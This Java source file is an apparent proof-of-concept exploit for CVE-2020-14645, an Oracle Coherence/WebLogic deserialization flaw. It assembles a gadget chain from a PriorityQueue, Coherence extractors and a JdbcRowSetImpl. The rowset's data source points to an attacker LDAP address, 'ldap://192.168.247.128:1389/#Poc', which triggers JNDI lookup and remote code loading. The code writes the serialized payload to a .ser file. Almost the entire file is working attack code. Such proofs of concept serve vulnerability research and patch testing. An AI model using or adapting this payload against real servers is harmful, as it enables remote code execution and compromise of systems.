import com.sun.rowset.JdbcRowSetImpl;
import com.tangosol.util.ValueExtractor;
import com.tangosol.util.comparator.ExtractorComparator;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;
import com.tangosol.util.extractor.UniversalExtractor;
import ysoserial.payloads.util.Reflections;

import java.io.File;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CVE_2020_14645 {
    public static void main(String[] args) throws Exception {
        ReflectionExtractor reflectionExtractor1 = new ReflectionExtractor("toString",new Object[]{});
        ValueExtractor[] valueExtractor_list1 = {reflectionExtractor1};

        ChainedExtractor chainedExtractor = new ChainedExtractor(valueExtractor_list1);

        PriorityQueue<Object> queue = new PriorityQueue(2, new ExtractorComparator(chainedExtractor));
        queue.add("1");
        queue.add("1");

        UniversalExtractor universalExtractor = new UniversalExtractor();
        Object object = new Object[]{};
        Reflections.setFieldValue(universalExtractor,"m_aoParam",object);
        Reflections.setFieldValue(universalExtractor,"m_sName","DatabaseMetaData");
        Reflections.setFieldValue(universalExtractor,"m_fMethod",false);

        ValueExtractor[] valueExtractor_list2 = new ValueExtractor[]{
                universalExtractor
        };

        Field field = ChainedExtractor.class.getSuperclass().getDeclaredField("m_aExtractor");
        field.setAccessible(true);
        field.set(chainedExtractor,valueExtractor_list2);

        JdbcRowSetImpl jdbcRowSet = Reflections.createWithoutConstructor(com.sun.rowset.JdbcRowSetImpl.class);
        jdbcRowSet.setDataSourceName("ldap://192.168.247.128:1389/#Poc");

        Object[] queueArray = (Object[])((Object[]) Reflections.getFieldValue(queue, "queue"));
        queueArray[0] = jdbcRowSet;
//        queueArray[1] = 1;

        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(new File("cve_2020_14645.ser")));
        out.writeObject(queue);
        out.flush();
        out.close();
    }

}
